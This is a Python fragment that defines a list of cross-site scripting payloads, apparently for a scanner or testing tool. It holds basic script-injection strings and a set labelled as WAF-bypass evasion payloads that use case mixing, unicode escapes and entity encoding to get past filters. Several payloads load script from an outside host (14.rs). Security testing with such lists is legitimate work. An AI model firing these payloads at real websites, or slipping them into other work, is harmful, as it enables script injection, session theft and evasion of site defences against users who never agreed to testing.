# Basic XSS Payloads
XSS_PAYLOADS = [
    r"<script>alert(1)</script>",
    r"<img src=x onerror=alert(1)>",
    r"<svg onload=alert(1)>",
    r"<input autofocus onfocus=alert(1)>",
    r"<div onmouseover=alert(1)>hover</div>",
    r"<iframe src=javascript:alert(1)></iframe>",
    r"javascript:alert(1)",
    r"data:text/html,<script>alert(1)</script>",
    r"#<script>alert(1)</script>",
    r"<base href='javascript:alert(1)//'>",
]

# Advanced Evasion Payloads (WAF bypass, encoding tricks, alternative vectors)
XSS_PAYLOADS += [
    r'\'"</Script><Html Onmouseover=(confirm)()//<imG/sRc=l oNerrOr=(prompt)() x>',
    r'<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    r'<deTails open oNToggle=confi\u0072m()>',
    r'<img sRc=l oNerrOr=(confirm)() x>',
    r'<svg/x=">"/onload=confirm()//',
    r'<svg%0Aonload=%09((pro\u006dpt))()//',
    r'<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    r'<sCript x>confirm``</scRipt x>',
    r'<Script x>prompt()</scRiPt x>',
    r'<sCriPt sRc=//14.rs>',
    r'<embed//sRc=//14.rs>',
    r'<base href=//14.rs/><script src=/>',
    r'<object//data=//14.rs>',
    r'<s=" onclick=confirm``>clickme',
    r'<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    r'\'"><y///oNMousEDown=((confirm))()>Click',
    r'<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    r'<img src=x onerror=confir\u006d`1`>',
    r'<svg/onload=co\u006efir\u006d`1`>',
]
